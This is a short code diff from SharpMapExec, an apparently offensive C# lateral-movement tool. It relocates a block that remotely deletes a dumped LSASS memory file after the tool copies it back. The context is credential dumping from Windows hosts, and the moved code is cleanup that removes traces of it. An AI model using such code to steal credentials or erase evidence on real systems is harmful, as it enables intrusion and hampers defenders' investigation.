@@ -407,18 +407,18 @@ namespace SharpMapExec.Lib
                 {
                     Console.WriteLine("[-] Failed to Copy Lsass Dump File");
                 }
+                try
+                {
+                    (Collection<PSObject> result2, Collection<ErrorRecord> errors2) = InvokeCommand(computer, String.Format("if(test-path {0}){{remove-item {0} -force}}", path), false, auth, scheme);
+                }
+                catch
+                {
+                    Console.WriteLine(String.Format("  [-] Failed to delete {0}", path));
+                }
             }
             catch
             {
                 Console.WriteLine("[-] Failed to Dump Lsass");
-            }
-            try
-            {
-                (Collection<PSObject> result2, Collection<ErrorRecord> errors2) = InvokeCommand(computer, String.Format("if(test-path {0}){{remove-item {0} -force}}", path), false, auth, scheme);
-            }
-            catch
-            {
-                Console.WriteLine(String.Format("  [-] Failed to delete {0}", path));
             }
         }
 
